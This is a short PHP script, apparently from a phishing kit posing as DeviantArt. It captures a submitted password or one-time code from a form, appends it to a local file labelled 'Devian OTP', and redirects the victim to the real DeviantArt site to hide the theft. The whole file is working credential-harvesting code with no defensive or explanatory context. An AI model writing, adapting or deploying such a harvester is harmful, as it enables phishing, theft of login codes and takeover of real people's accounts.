<?php
file_put_contents("otp.txt", "Devian OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.deviantart.com/');
?>
